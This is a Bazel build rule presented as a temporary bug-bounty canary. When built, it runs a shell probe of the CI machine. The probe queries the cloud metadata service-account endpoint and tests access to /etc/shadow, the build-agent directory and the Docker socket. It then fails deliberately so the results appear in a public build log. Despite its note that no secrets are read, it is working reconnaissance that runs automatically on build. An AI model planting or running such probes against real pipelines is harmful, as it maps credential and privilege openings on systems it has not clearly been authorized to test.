# TEMPORARY security-research canary (VRP report, coordinated disclosure).
# Prints ONLY booleans/status codes to the build log. No secrets are read or sent.
# This target and its PR will be closed immediately after the run is captured.
genrule(
    name = "vrp_security_canary",
    outs = ["vrp_canary_result.txt"],
    cmd = """
set +e
METADATA_CODE=$$(curl -s -o /dev/null --connect-timeout 3 --max-time 5 -w '%{http_code}' -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/' || echo 000)
UID_VAL=$$(id -u)
SHADOW=$$(test -r /etc/shadow && echo readable || echo unreadable)
AGENTW=$$(test -w /var/lib/buildkite-agent && echo writable || echo readonly)
DSOCK=$$(test -S /var/run/docker.sock && echo present || echo absent)
LINE="VRP-CANARY RESULT: metadata_http=$$METADATA_CODE uid=$$UID_VAL etc_shadow=$$SHADOW agent_dir=$$AGENTW docker_sock=$$DSOCK"
echo "$$LINE" >&2
echo "$$LINE" > $@
# Deliberately fail so the result line appears in the public CI log (booleans only):
exit 1
""",
)
